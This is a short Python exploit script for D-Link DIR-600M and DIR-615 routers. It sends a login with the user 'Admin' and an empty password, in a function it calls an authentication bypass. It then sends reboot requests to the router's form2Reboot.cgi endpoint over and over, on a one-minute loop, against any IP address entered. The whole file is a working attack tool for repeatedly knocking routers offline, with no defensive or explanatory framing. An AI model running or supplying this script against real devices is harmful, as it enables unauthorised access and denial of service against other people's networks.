'''
Dlink router reboot sequence
Tested for model:
	dir-600M
	dir-615
'''

import urllib.request as urlcon
import time

def authBypass(ip):
	url="http://"+ip+"/login.cgi"
	data='username=Admin&password=&submit.htm%3Flogin.htm=Send'.encode('UTF-8')
	headers={}
	headers['Host']=ip
	headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'
	headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	headers['Accept-Language']='en-US,en;q=0.5'
	headers['Accept-Encoding']='gzip, deflate'
	headers['Referer']='http://'+ip+'/login.htm'
	headers['Content-Type']='application/x-www-form-urlencoded'
	headers['Content-Length']=len(data)
	headers['Connection']='keep-alive'
	headers['Upgrade-Insecure-Requests']='1'
	
	rq=urlcon.Request(url,data=data,headers=headers,method='POST')
	res=urlcon.urlopen(rq)
	getres=res.read().decode("UTF-8")
	res.close()
	check='''<body onload="window.location.href=\'index.htm\';">'''
	if check in getres:
		return True
	else:
		return False

def rebootBot(ip):
	url="http://"+ip+"/form2Reboot.cgi"
	data='reboot=Reboot&submit.htm%3Freboot.htm=Send'.encode('UTF-8')
	headers={}
	headers['Host']=ip
	headers['Cookie']='SessionID='
	headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'
	headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	headers['Accept-Language']='en-US,en;q=0.5'
	headers['Accept-Encoding']='gzip, deflate'
	headers['Referer']='http://'+ip+'/status.htm'
	headers['Content-Type']='application/x-www-form-urlencoded'
	headers['Content-Length']=len(data)
	headers['Connection']='keep-alive'
	headers['Upgrade-Insecure-Requests']='1'
	
	rq=urlcon.Request(url,data=data,headers=headers,method='POST')
	res=urlcon.urlopen(rq)
	getres=res.read().decode("UTF-8")
	res.close()
	check='''You clicked reboot button! System is rebooting now...'''
	if check in getres:
		return True
	else:
		return False
	
if __name__=="__main__":
	ip=input("Enter an IP: ")
	n=int(input("No of Reboot: "))
	if authBypass(ip):
		if n==1:
			print("[$]Reboot sequence 1")
			if rebootBot(ip):
				print(">> Sucess.")
			else:
				print(">> Error!")
		else:
			for a in range(n):
				print("[$]Reboot sequence {}".format(a))
				if rebootBot(ip):
					print(">> Sucess.")
				else:
					print(">> Error!")
				time.sleep(60)
				if not authBypass(ip):
					print("[*]Next authBypass error!")
					break
	else:
		print("[*]Auth error!")
			